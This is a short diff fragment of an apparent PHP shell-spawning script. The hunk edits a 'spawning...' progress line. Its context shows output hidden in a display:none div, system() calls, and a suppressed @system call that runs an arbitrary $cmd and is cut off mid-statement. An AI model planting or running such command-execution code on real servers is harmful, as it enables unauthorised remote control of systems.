@@ -57,7 +57,7 @@ echo "
 echo "<div style=display:none>";
 system("clear");
 system("echo '\e[38;5;198mShell attach kindly to internet'");
-echo "\033[44mspawning... {$i}\r"."\033[37m";
+echo "\033[44mspawning...%\r"."\033[37m";
 usleep(100000);
 echo "\n</div>\n";
 @system("$cmd 2>&1 > shell &&
